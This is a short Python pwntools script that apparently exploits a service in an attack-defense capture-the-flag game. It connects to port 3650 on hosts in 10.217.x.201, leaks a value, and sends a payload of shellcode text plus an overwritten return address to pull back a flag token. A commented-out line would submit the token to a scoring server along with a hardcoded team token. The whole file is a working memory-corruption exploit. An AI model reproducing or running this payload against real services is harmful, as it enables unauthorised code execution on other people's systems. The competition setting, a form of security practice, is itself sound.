#!/usr/bin/env python
import sys 
from pwn import *
import time
import requests

ip = '10.217.1.201'
port = 3650

r = remote(ip,port)
while True:
	for i in range(6, 7):
#		if i == 6:
#			continue
		try:
			ip = '10.217.' + str(i) + '.201'
			r = remote(ip, port)

			r.sendline("2")
			r.sendline("$?")

			str_140 = r.recvline()
			str_140 = str_140[:len(str_140) - 1]
			r.sendline("3")
			tail = "McCJw4nBsasB4YnCsASzAbIgzYCwAc2AAA\n111122223333" + "\x69\xc3\x04\x08"

			print "payload " + ": " + str_140 + tail
			r.sendline(str_140+tail)

			r.recvuntil(" = ")
			token = r.recv()
			print token
			r.close()
#			p = requests.get("http://10.217.0.100/team/submit_key?token=1d695aa7615cb3d485b3a06c920590a1&key=" + token)
#			print p.content
		except:
			pass
	break
	time.sleep(10)
